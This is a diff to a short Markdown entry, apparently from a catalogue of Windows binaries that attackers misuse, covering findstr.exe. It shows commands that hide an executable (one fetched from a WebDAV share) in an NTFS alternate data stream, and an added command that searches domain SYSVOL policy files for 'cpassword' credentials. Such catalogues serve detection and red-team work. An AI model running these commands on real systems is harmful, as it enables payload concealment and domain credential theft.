@@ -1,11 +1,13 @@
 ## Findstr.exe
 
-* Functions: Add ADS
+* Functions: Add ADS, Search
 
 ```
 findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe    
 
 findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe    
+
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 ```
 
 Acknowledgements:
